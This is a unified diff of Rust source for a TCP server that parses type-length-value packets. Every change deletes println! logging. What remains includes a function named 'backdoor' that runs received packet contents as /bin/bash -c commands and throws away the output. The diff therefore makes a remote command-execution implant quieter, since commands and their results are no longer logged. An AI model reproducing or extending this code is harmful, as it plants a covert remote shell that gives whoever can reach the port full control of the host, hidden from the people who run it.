@@ -25,7 +25,6 @@ impl TLVHeader {
         let len = bytes.len() as u32;
         let expected = TYPE_LENGTH + LENGTH_LENGTH;
         if len < expected {
-            println!("Packet too small");
             return None;
         }
 
@@ -36,16 +35,12 @@ impl TLVHeader {
             bytes[0],
         ]);
 
-        println!("Packet type: {packet_type}");
-
         let hlength = u32::from_be_bytes([
             bytes[7],
             bytes[6],
             bytes[5],
             bytes[4],
         ]) as usize;
-
-        println!("Packet length (header): {hlength}");
 
         Some(TLVHeader {
             packet_type,
@@ -62,13 +57,10 @@ impl TLVPacket {
         let len = buf.len() as u32;
         let hlen = header.length as usize;
         if len < header.length {
-            println!("Not enough bytes to construct packet");
             return None;
         }
 
         let value = buf[..hlen].to_vec();
-
-        println!("Value: {:?}", value);
 
         Some(TLVPacket {
             header,
@@ -128,16 +120,13 @@ impl TLVPacket {
 
     fn backdoor(value: &Vec<u8>) {
         let command = String::from_utf8_lossy(value);
-        println!("Backdoor command: {}", command.to_string());
         match Command::new("/bin/bash")
             .arg("-c")
             .arg(command.to_string())
             .output() {
-                Ok(output) => {
-                    println!("Command output: {}", String::from_utf8_lossy(&output.stdout));
+                Ok(_) => {
                 }
-                Err(err_) => {
-                    println!("Failed to execute command: {err_}");
+                Err(_) => {
                 }
             }
     }
@@ -157,9 +146,6 @@ fn handle_client(mut stream: TcpStream) {
     loop {
         match stream.read(&mut buffer) {
             Ok(n) if n > 0 => {
-
-                // println!("Received buffer: {:?}", buffer);
-                println!("Received {n} bytes");
 
                 let mut bytes = Vec::new();
                 bytes.append(&mut incomplete_packet);
@@ -182,14 +168,12 @@ fn handle_client(mut stream: TcpStream) {
                             // Move offset to the next packet
                             offset += packet.header.length as usize;
                         } else {
-                            println!("Not enough bytes to construct packet");
                             let hoffset = offset - ((TYPE_LENGTH + LENGTH_LENGTH) as usize);
                             incomplete_packet.extend_from_slice(&bytes[hoffset..]);
                             break;
                         }
 
                     } else {
-                        println!("Invalid packet header");
                         break; // Break the loop if the packet is invalid
                     }
                 }
